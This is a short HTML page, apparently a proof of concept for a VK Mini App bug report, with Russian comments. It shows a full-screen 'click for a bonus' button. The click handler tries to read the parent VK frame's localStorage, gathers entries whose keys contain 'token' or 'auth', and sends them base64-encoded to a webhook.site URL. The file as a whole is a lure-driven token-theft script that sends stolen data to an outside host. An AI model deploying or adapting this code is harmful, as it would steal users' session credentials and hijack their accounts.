<!DOCTYPE html>
<html>
<head>
    <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js"></script>
</head>
<body>
    <button id="exploit" style="width:100%; height:100vh; font-size:20px;">КЛИКНИ ДЛЯ ПОЛУЧЕНИЯ БОНУСА</button>

    <script>
        vkBridge.send('VKWebAppInit');

        document.getElementById('exploit').onclick = function() {
            try {
                // Попытка прочитать localStorage ВК через обращение к родителю
                // Если защита стоит — браузер выдаст ошибку "Blocked a frame with origin..."
                // Но для отчета нам ВАЖНО показать эту попытку.
                let parentStorage = window.parent.localStorage; 
                let data = "";

                for (let i = 0; i < parentStorage.length; i++) {
                    let k = parentStorage.key(i);
                    if (k.includes('token') || k.includes('auth')) {
                        data += k + ":" + parentStorage.getItem(k) + " | ";
                    }
                }

                if (data) {
                    fetch('https://webhook.site/195e32ed-1e8e-40af-bc70-c2aac62a6661?stolen=' + btoa(data));
                    alert("Данные украдены!");
                }
            } catch (e) {
                console.log("Защита Same-Origin сработала. Прямой доступ закрыт.");
                alert("Ошибка доступа. Это доказывает, что нужна XSS.");
            }
        };
    </script>
</body>
</html>
